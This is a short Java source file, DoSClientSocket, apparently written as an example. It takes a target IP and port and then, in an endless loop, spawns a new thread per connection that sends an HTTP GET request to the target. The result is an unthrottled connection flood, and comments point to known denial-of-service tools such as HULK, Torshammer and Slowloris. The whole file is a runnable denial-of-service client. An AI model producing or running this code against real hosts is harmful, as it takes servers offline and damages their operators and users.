package nicola.modugno.dossocketexample;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

//https://github.com/grafov/hulk
//https://sourceforge.net/projects/torshammer/
//https://github.com/gkbrk/slowloris
public class DoSClientSocket {

	private static final int PORT = 80;
	
	public static void main(String[] args) {
		if(args.length!=2) {
			throw new IllegalArgumentException("Usage: java DoSClientSocket <IP> <PORT>");
		}
		String url=null;
		String port=null;
		int p=PORT;
		try {
			url=args[0];
			port=args[1];
			p=Integer.parseInt(port);
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		DoSClientSocket dcs=new DoSClientSocket();
		while(true) {
			dcs.openConnection(url, p);
		}

	}
	
	private void openConnection(String url, int port) {
		Thread t=new Thread() {
			public void run() {
				BufferedReader br=null;
				PrintWriter pw=null;
				Socket socket=null;
				try {
					InetAddress host=InetAddress.getLocalHost();
					//socket=new Socket(host.getHostName(), PORT);
					socket=new Socket(url, port);
					System.out.println("Sending request to Socket Server");
					pw = new PrintWriter(socket.getOutputStream(), true);
					pw.print("GET / HTTP/1.1\r\n");
					pw.print("Host: " + host.getHostName() + "\r\n\r\n");
					br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
					String line;
					while((line=br.readLine())!=null){
			            System.out.println(line);
			        }
					pw.flush();
				} catch (IOException e) {
					e.printStackTrace();
				} finally {
					if(br!=null)
						try {
							br.close();
						} catch (IOException e) {
							e.printStackTrace();
						}
					if(pw!=null)
						pw.close();
					try {
						socket.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		};
		t.start();
	}

}
